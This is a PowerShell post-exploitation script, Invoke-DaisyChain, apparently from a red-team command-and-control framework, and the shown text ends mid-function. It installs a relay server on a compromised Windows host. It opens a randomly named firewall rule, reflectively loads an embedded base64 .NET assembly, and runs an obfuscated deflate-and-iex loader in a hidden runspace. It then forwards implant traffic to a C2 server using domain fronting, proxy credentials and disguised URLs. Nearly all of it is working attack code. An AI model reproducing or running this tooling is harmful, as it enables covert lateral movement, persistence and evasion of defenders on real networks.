﻿<#
.Synopsis
    Invoke-DaisyChain

    Ben Turner @benpturner

.DESCRIPTION
	PS C:\> Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass -localhost (optional if low level user)
.EXAMPLE
    PS C:\> Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080
.EXAMPLE
    PS C:\> Invoke-DaisyChain -daisyserver http://10.150.10.20 -port 8888 -c2port 8888 -c2server http://10.150.10.10 -URLs '"pwned/test/123","12345/drive/home.php"'
#>
$Global:firewallName = ""
$Global:serverPort = ""
function Invoke-DaisyChain {

param(
[Parameter(Mandatory=$true)][string]$port, 
[Parameter(Mandatory=$true)][string]$daisyserver,
[Parameter(Mandatory=$true)][string]$c2server, 
[Parameter(Mandatory=$true)][string]$c2port,
[Parameter(Mandatory=$true)][string]$URLs,
[Parameter(Mandatory=$false)][switch]$Localhost,
[Parameter(Mandatory=$false)][switch]$NoFWRule,
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$domfront, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyurl, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyuser, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxypassword
)

if ($firewallName) {
    echo "[-] DaisyServer already ran in this implant cannot run twice due to prefixes being defined"

} else {
    
$fw = Get-FirewallName -Length 15
$script:firewallName = $fw
$firewallName = $fw 
$script:serverPort = $port
$serverPort = $port

if ($Localhost.IsPresent){
echo "[+] Using localhost parameter"
$HTTPServer = "localhost"
$daisyserver = "http://localhost"
$NoFWRule = $true
} else {
$HTTPServer = "+"
}

$script:serverPort = $port
if ($NoFWRule.IsPresent) {
    $fwcmd = "echo `"No firewall rule added`""
}else {
    echo "Adding firewall rule name: $firewallName for TCP port $port"
    echo "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
    $fwcmd = "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
}

$fdsf = @"
`$URLS = $($URLS)
`$Asm = "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bENhY2hlAGNvb2tpZQBJRGlzcG9zYWJsZQBnZXRfQXN5bmNXYWl0SGFuZGxlAFdhaXRPbmUAZ2V0X1Jlc3BvbnNlAEh0dHBMaXN0ZW5lclJlc3BvbnNlAGh0dHByZXNwb25zZQBDbG9zZQBEaXNwb3NlAFg1MDlDZXJ0aWZpY2F0ZQBXcml0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEJ5dGUAU3lzdGVtLlRocmVhZGluZwBFbmNvZGluZwBEb3dubG9hZFN0cmluZwBUb1N0cmluZwBTdG9wd2F0Y2gARmx1c2gAZ2V0X0xlbmd0aABVcmkAQXN5bmNDYWxsYmFjawBSZW1vdGVDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjawBzZXRfU2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sATGlzdGVuZXJDYWxsYmFjawBzZXRfQnlwYXNzUHJveHlPbkxvY2FsAE5ldHdvcmtDcmVkZW50aWFsAERhaXN5LmRsbABnZXRfUmF3VXJsAHByb3h5dXJsAGdldF9JbnB1dFN0cmVhbQBnZXRfT3V0cHV0U3RyZWFtAE1lbW9yeVN0cmVhbQBTeXN0ZW0AWDUwOUNoYWluAFN5c3RlbS5SZWZsZWN0aW9uAENvb2tpZUNvbGxlY3Rpb24ATmFtZVZhbHVlQ29sbGVjdGlvbgBXZWJIZWFkZXJDb2xsZWN0aW9uAEh0dHBMaXN0ZW5lclByZWZpeENvbGxlY3Rpb24Ac2V0X1Bvc2l0aW9uAHNldF9TdGF0dXNEZXNjcmlwdGlvbgBTdG9wAEh0dHBSZXF1ZXN0SGVhZGVyAGRvbWFpbmZyb250aGVhZGVyAFNlcnZpY2VQb2ludE1hbmFnZXIAYm9vbExpc3RlbmVyAEh0dHBMaXN0ZW5lcgBsaXN0ZW5lcgByZWZlcmVyAHByb3h5dXNlcgBEYWlzeVNlcnZlcgBodHRwc2VydmVyAElFbnVtZXJhdG9yAEdldEVudW1lcmF0b3IALmN0b3IALmNjdG9yAFVSTHMAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGdldF9Db29raWVzAHNldF9BdXRoZW50aWNhdGlvblNjaGVtZXMAU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzAEFsbG93VW50cnVzdGVkQ2VydGlmaWNhdGVzAEdldEJ5dGVzAGdldF9QcmVmaXhlcwBJQ3JlZGVudGlhbHMAc2V0X0NyZWRlbnRpYWxzAGdldF9EZWZhdWx0Q3JlZGVudGlhbHMAc2V0X1VzZURlZmF1bHRDcmVkZW50aWFscwBDb250YWlucwBTeXN0ZW0uQ29sbGVjdGlvbnMAZ2V0X0hlYWRlcnMAU3NsUG9saWN5RXJyb3JzAHNldF9BZGRyZXNzAENvbmNhdABGb3JtYXQAT2JqZWN0AFN5c3RlbS5OZXQASUFzeW5jUmVzdWx0AHJlc3VsdAB1c2VyYWdlbnQAV2ViQ2xpZW50AGdldF9DdXJyZW50AFN0YXJ0AGh0dHBzZXJ2ZXJwb3J0AGdldF9SZXF1ZXN0AFdlYlJlcXVlc3QASHR0cExpc3RlbmVyUmVxdWVzdABQcm9jZXNzUmVxdWVzdABNb3ZlTmV4dABTeXN0ZW0uVGV4dABIdHRwTGlzdGVuZXJDb250ZXh0AEVuZEdldENvbnRleHQAQmVnaW5HZXRDb250ZXh0AFN0YXJ0TmV3AHgAU3RhcnREYWlzeQBvcF9FcXVhbGl0eQBTeXN0ZW0uTmV0LlNlY3VyaXR5AElzTnVsbE9yRW1wdHkAZ2V0X1Byb3h5AHNldF9Qcm94eQBJV2ViUHJveHkAegAAAAAAH2gAdAB0AHAAOgAvAC8AewAwAH0AOgB7ADEAfQAvAAAJSABvAHMAdAAAFVUAcwBlAHIALQBBAGcAZQBuAHQAAQ9SAGUAZgBlAHIAZQByAAA1LwBwAGwAdQBnAGkAbgBzAC8ANwA3AC8AdgAxAC4AMAAvAHMAdABhAHQAcwAuAHAAaABwAAAJewAwAH0AOwAAB0cARQBUAAANewAwAH0AewAxAH0AAAlQAE8AUwBUAAAZQwBhAGMAaABlAEMAbwBuAHQAcgBvAGwAAEduAG8ALQBjAGEAYwBoAGUALAAgAG4AbwAtAHMAdABvAHIAZQAsACAAbQB1AHMAdAAtAHIAZQB2AGEAbABpAGQAYQB0AGUAAQ1QAHIAYQBnAG0AYQAAEW4AbwAtAGMAYQBjAGgAZQABD0UAeABwAGkAcgBlAHMAAAMwAAAFTwBLAACAl00AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAzADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAVABvAHUAYwBoADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvAAABAIH9PAAhAEQATwBDAFQAWQBQAEUAIABIAFQATQBMACAAUABVAEIATABJAEMAIAAiAC0ALwAvAEkARQBUAEYALwAvAEQAVABEACAASABUAE0ATAAgADIALgAwAC8ALwBFAE4AIgA+AA0ACgA8AGgAdABtAGwAPgA8AGgAZQBhAGQAPgANAAoAPAB0AGkAdABsAGUAPgA0ADAANAAgAE4AbwB0ACAARgBvAHUAbgBkADwALwB0AGkAdABsAGUAPgANAAoAPAAvAGgAZQBhAGQAPgA8AGIAbwBkAHkAPgANAAoAPABoADEAPgBOAG8AdAAgAEYAbwB1AG4AZAA8AC8AaAAxAD4ADQAKADwAcAA+AFQAaABlACAAcgBlAHEAdQBlAHMAdABlAGQAIABVAFIATAAvAHMAIAB3AGEAcwAgAG4AbwB0ACAAZgBvAHUAbgBkACAAbwBuACAAdABoAGkAcwAgAHMA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"
`$DllBytes  = [System.Convert]::FromBase64String(`$Asm)
`$Assembly = [System.Reflection.Assembly]::Load(`$DllBytes)
`$DaisyServer = New-Object DaisyServer
[DaisyServer]::server = "${c2server}:${c2port}"
[DaisyServer]::httpserverport = "$port"
[DaisyServer]::httpserver = "$HTTPServer"
[DaisyServer]::useragent = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
[DaisyServer]::URLs = @($($URLS))
[DaisyServer]::proxyurl = "$proxyurl"
[DaisyServer]::proxyuser = "$proxyuser"
[DaisyServer]::proxypassword = "$proxypassword"
[DaisyServer]::domainfrontheader = "$domfront"
[DaisyServer]::referer = `$null
[DaisyServer]::StartDaisy()
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

$t = Invoke-Netstat| ? {$_.ListeningPort -eq $port}
$global:kill = [HashTable]::Synchronized(@{})
$kill.log = "1"

$fwcmd|iex

if (!$t) { 
    if (Test-Administrator) { 
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null
        echo ""
        echo "[+] Running DaisyServer as Administrator:"
    } else { 
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null 
        echo ""
        echo "[+] Running DaisyServer as Standard User, must use -localhost flag for this to work:"
    }  

    echo "[+] To stop the Daisy Server, run StopDaisy in the current process"
}
}


}
function Stop-Daisy {    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        $webClient.DownloadString("http://localhost:$serverPort/plugins/77/v1.0/stats.php")|Out-Null            
    } catch {}
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        $webClient.DownloadString("http://localhost:$serverPort/plugins/77/v1.0/stats.php")|Out-Null            
    } catch {}
    $error.clear()
    Netsh.exe advfirewall firewall del rule name="$firewallName"
}
function StopDaisy {    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        $webClient.DownloadString("http://localhost:$serverPort/plugins/77/v1.0/stats.php")|Out-Null            
    } catch {}
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        $webClient.DownloadString("http://localhost:$serverPort/plugins/77/v1.0/stats.php")|Out-Null            
    } catch {}
    $error.clear()
    Netsh.exe advfirewall firewall del rule name="$firewallName"
}

function Get-FirewallName 
{
param (
    [int]$Length
)
$set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
$result = ''
for ($x = 0; $x -lt $Length; $x++) 
{
    $result += $set | Get-Random
}
return $result
}
Function Invoke-Netstat {                       
try {            
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
    $Connections = $TCPProperties.GetActiveTcpListeners()            
    foreach($Connection in $Connections) {            
